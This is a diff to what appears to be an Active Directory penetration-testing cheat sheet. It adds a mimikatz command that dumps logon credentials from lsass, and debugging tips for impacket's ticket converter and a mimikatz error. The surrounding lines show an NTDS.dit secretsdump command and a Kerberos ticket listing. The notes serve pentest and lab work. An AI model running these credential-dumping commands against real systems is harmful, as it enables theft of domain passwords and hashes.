@@ -629,6 +629,12 @@ secretsdump.py -ntds /tmp/ntds.dit -system /tmp/SYSTEM local -outputfile /tmp/AD
 sekurlsa::tickets
 ```
 
+- Dumping credentials from lsass
+
+```
+.\mimikatz.exe "log" "privilege::debug" "sekurlsa::logonpasswords" "exit"
+```
+
 ### :open_file_folder: Vulnerabilities
 
 - [sAMAccountName spoofing (NoPac) CVE-2021-42278 & CVE-2021-42287](https://github.com/ShutdownRepo/The-Hacker-Recipes/blob/master/ad/movement/kerberos/samaccountname-spoofing.md)
@@ -745,6 +751,25 @@ find hidden information
 
 ```powershell
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
+```
+
+### :open_file_folder: tool debug
+
+ticket_converter.py (convert ticket to UNIX <-> Windows format)
+
+modify KeyBlock to KeyBlockV4
+
+```
+ImportError: cannot import name 'KeyBlock' from 'impacket.krb5.ccache'
+```
+
+mimikatz
+
+try using old version
+
+```
+sekurlsa::logonpasswords
+mimikatz # ERROR kuhl_m_sekurlsa_acquireLSA ; Key import
 ```
 
 ### :open_file_folder: Test Environment
